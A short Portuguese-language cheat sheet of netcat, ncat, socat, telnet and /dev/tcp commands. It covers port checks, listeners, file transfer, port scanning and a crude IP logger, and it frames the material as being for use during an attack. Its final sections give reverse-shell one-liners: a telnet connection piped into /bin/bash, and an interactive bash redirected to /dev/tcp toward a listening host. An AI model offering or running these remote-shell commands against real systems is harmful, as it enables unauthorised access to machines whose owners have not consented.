## NETCAT

Verificando Portas:

```nc www.site.com.br 21``` 

```nc -v www.site.com.br 80``` 

Verificando serviços em execução:

```netstat -nlpt```

Abrindo Porta:

```nc -vlp 123```

Se conectando a porta aberta:

```nc 192.168.0.1 123```

**Exemplo de IP Logger:**

Abrindo porta:

```nc -vnlp 80```

Alvo apos acessar via browser é possivel capturar o ip:

```nc Site_ou_Ip 80```

**Transferencia de Arquivos:**

Enviando o arquivo para o ip e porta criada:

``` nc -v 192.168.0.1 123 < ncat.exe ```

Baixando o arquivo enviado:

``` nc -vnlp 123 > ncat.exe ```

**PortScan**

Scanneando uma unica porta:

``` nc -vnz 192.168.0.1 21 ```

Scaneando um range de portas:

``` nc -vnz 192.168.0.1 20-30 ```

## NCAT

Obs.: Alem do Netcat você pode usar o ncat caso queira proteger todos os dados que estão trafegando durante o ataque, o ncat possui recursos de criptográfia.

## SOCAT

Abrindo porta:

``` socat - tcp4-listen:123 ```

Acessando porta aberta:

``` nc -vn 192.168.0.1 123 ```

## TELNET

Abrindo porta:

``` nc -vnlp 123 ```

Acessando porta aberta:

``` telnet 192.168.0.1 123 | /bin/bash ```

## /DEV/TCP/

Abrindo Porta:

```nc -l 123```

Enviando Shell:

``` bash -i > /dev/tcp/192.168.0.1/123 0>&1 ```

















